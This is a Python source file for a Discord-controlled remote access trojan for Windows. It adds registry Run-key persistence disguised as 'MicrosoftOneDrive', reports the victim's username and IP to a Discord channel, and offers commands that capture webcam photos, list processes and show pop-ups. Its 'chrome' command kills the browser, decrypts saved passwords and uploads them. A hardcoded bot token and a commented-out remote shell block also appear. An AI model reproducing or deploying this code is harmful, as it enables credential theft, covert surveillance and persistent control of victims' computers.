import discord
from discord.ext import commands
import getpass
import cv2
import os
import time
import requests
import win32crypt
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import cv2
import psutil
import shutil 
import base64
import json 
import sqlite3
import pyautogui
import ctypes
import subprocess
import winreg
user = getpass.getuser()

TOKEN = "MTMwNjY1NDc1Nzc1Mzk3ODg5MA.GqK3rx._weZ2FA59XjQsw_6xG9E7xjlOeyUZpcFIXaSC4"

os.remove("C:\Users\defaultuser0\AppData\Local\Google\Chrome\User Data\runtime.zip")

runkey = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
winreg.SetValueEx(runkey, "MicrosoftOneDrive", 0, winreg.REG_SZ, fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\runcut.lnk")
runkey.Close()

cwd = os.getcwd()
cmd_active = False
client = commands.Bot(command_prefix=".", intents=discord.Intents.all())

def is_admin():
    try:
        is_admin = os.getuid() == 0
        return False
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return True


def get_ip():
    ip = requests.get("https://icanhazip.com/")
    ip = ip.content.decode('utf-8').strip()
    return ip

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): # or discord.ext.commands.errors.CommandNotFound as you wrote
        await ctx.send("Unknown command")

@client.event
async def on_ready():
    channel = client.get_channel(1306652725030682684)
    await channel.send(f"```Connected | {user} | IP: {get_ip()}```")

@client.command()
async def photo(ctx):
    capture = cv2.VideoCapture(0)
    if capture.isOpened():
        ret, frame = capture.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            os.system(f"attrib +h \"webcam.jpg\"")
            await ctx.send(file=discord.File('webcam.jpg'))
            time.sleep(1)
            os.remove("webcam.jpg")

@client.command()
async def chrome(ctx):
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Local State", "./")
    with open(path, "r") as f:
        local_state = json.load(f)
        os.system(f"attrib +h \"{path}\"") 
    dpapi_encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    os.remove("./Local State")
    dpapi_encrypted_key = dpapi_encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(dpapi_encrypted_key, None, None, None, 0)[1]

    if "chrome.exe" in (i.name() for i in psutil.process_iter()):
        os.system("taskkill /F /IM chrome.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "./")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Login Data")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = cursor.fetchall()
    conn.close()
    with open("./chrome.txt", 'w') as f:
        path = "./chrome.txt"
        os.system(f"attrib +h \"{path}\"")
        for url, username_value, password_value in results:
            cipher = AES.new(key, AES.MODE_GCM, nonce=password_value[3:15])
            decrypted_pass = cipher.decrypt(password_value[15:])
            decrypted_password = decrypted_pass[:-16].decode()
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username_value}\n")
            f.write(f"Password: {decrypted_password}\n")
            f.write("------------------------\n")
    await ctx.send(file=discord.File(fr'C:\Users\{user}\Desktop\slasher3\chrome.txt'))
    time.sleep(1)
    os.remove("./Login Data")
    os.remove("./chrome.txt")

@client.command()
async def alert(ctx, arg1):
    pyautogui.alert(arg1, title=" ")

@client.command(aliases=["processes", "task", "taskmanager"])
async def tasks(ctx):
    msg = []
    for task in os.popen("TASKLIST /M"):
        
        msg.append(i + "\n")
    await ctx.send(msg)

@client.command()
async def endsession(ctx):
    await ctx.send(f"```Session Closed | {user} | IP: {get_ip()}```")
    exit()

    

"""@client.command()
async def cmdstart(ctx):
    cmd_active = True
    process = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    await ctx.send(f"```CMD Session Started. Admin = {is_admin}```")
    await ctx.send(f"```In: {cwd}```")
    send_cmd(process)
    """







    

client.run(TOKEN)